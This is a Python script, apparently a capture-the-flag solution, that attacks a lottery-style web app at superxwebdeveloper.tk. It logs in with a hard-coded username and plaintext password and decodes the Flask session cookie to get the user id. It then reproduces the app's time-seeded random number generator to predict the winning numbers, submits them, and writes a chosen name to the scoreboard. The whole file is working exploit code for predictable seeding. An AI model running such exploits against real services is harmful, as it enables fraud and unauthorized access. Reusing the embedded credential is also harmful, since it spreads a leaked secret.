import requests
from requests.auth import HTTPBasicAuth
from requests.utils import dict_from_cookiejar
import time
from flask_unsign.session import decode
import random
import sys


url_login = "https://superxwebdeveloper.tk/login"
url_winner = "https://superxwebdeveloper.tk/winner"
url_scoreboard = "https://superxwebdeveloper.tk/scoreboard"
username = "superXWebDeveloper"
password = "bA8wd5NkGvtMdaYgBbD3"


##Function we'll calculate
def good_numbers(id):
    random.seed(int(time.time()) + id)
    solution = random.sample(list(range(1,50)), 5)
    solution.sort()
    return ','.join([str(nb) for nb in solution])



def login(username, password):
    global url_login
    s = requests.Session()
    s.get(url_login) #Connect to url

    login = {'username' : username, "password" : password}
    result = s.post(url_login, data = login, allow_redirects = True )

    return s


def print_cookies(session):
    print( decode( dict_from_cookiejar(session.cookies)["session"] ) )




if __name__ == "__main__":
    name_of_the_player = ""
    if len(sys.argv) == 1 :
        name_of_the_player = "Quentin LAO"
    else :
        name_of_the_player = ' '.join(sys.argv[1:])

    #Creation session to log on the website
    session = login(username, password)
    print_cookies(session)

    #Get the user id in the cookie and guess the right numbers
    cookies = decode( dict_from_cookiejar(session.cookies)["session"] )
    id = cookies['id']
    payload = {"guess" : good_numbers(id)}
    result_winner = session.post(url_winner, data = payload, allow_redirects = True )
    print_cookies(session)
    print(result_winner.text)

    print("="*50)

    #Put the name in the hall of fame
    payload = {"name" : name_of_the_player, "date" : str(int(time.time())) }
    print(payload)
    result_hof = session.post(url_scoreboard, data = payload, allow_redirects = True )
    print_cookies(session)
    print(result_hof.text)
